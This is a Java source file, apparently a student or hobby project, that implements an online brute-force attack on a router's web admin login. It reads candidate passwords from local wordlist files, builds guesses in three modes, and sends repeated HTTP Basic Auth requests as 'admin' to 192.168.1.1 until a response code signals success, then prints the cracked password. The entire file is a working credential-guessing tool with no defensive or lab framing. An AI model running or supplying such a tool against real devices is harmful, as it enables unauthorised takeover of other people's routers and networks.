import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.HttpClientBuilder;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Scanner;
import java.io.File;

public class BruteForce
{
    PasswordGenerator cracker;
    ArrayList<String>testcase = new ArrayList<>();
    Scanner input = new Scanner(System.in);

    //-----------------------ModeA-----------------------------
    public void ModeA() throws IOException
    {
        System.out.println("Check your file please in location >> C:\\password1.txt");
        System.out.println("Are you sure ? (y/n) : ");

        if(input.next().toLowerCase().equals("y"))
        {
            try (Scanner in = new Scanner(new File("C:\\password1.txt"))) {
                while (in.hasNext()) testcase.add(in.nextLine());
            } catch (FileNotFoundException ex) {
                System.out.println("Files not found !");
                return;
            }
            cracker = new ModeA(testcase);
            check();
        }
    }
    //-----Mode B-------
    public void ModeB() throws IOException
    {
        System.out.println("Check your file please in location >> C:\\password1.txt");
        System.out.println("Are you sure ? (y/n) : ");
        if(input.next().toLowerCase().equals("y")){

            try (Scanner in = new Scanner(new File("C:\\password1.txt"))) {
                while (in.hasNext()) testcase.add(in.nextLine());
            } catch (FileNotFoundException ex) {
                System.out.println("Files not found !");
                return;
            }

            cracker = new ModeB(testcase);

            check();
        }
    }
    //-------------ModeC---------------
    public void ModeC() throws IOException {
        ArrayList<String> a = new ArrayList<>();
        ArrayList<String> b = new ArrayList<>();
        try (Scanner in = new Scanner(new File("C:\\password1.txt"))) {
            while (in.hasNext()) a.add(in.nextLine());
        } catch (FileNotFoundException ex) {
            System.out.println("Files not found !");
            return;
        }

        try (Scanner in = new Scanner(new File("C:\\password2.txt"))) {
            while (in.hasNext()) b.add(in.nextLine());
        } catch (FileNotFoundException ex) {
            System.out.println("Files not found !");
            return;
        }

        cracker = new ModeC(a, b);
        check();

    }

    void check() throws IOException {
        while (cracker.hasNextPassword())
        {
            String prePass = cracker.nextPassword();
            System.err.println("Test : " + cracker.getProgress() + " PrePass : "+prePass);
            if (CrackRes(prePass) == 400)
            {
                System.out.println("The password is = " + prePass);
                System.out.println("Press any key to continue...");
                input.nextLine();
                return;
            }
        }
        System.out.println("Sorry , We can't find password ..");
        System.out.println("Press any key to continue...");
        input.nextLine();input.nextLine();
    }

    //--------------
    int CrackRes(String password) throws IOException {
        CredentialsProvider provider = new BasicCredentialsProvider();
        UsernamePasswordCredentials credentials = new UsernamePasswordCredentials("admin", password);
        provider.setCredentials(AuthScope.ANY, credentials);
        HttpClient client = HttpClientBuilder.create().setDefaultCredentialsProvider(provider).build();
        HttpResponse response = client.execute(new HttpGet("http://192.168.1.1/"));
        return response.getStatusLine().getStatusCode();
    }
}
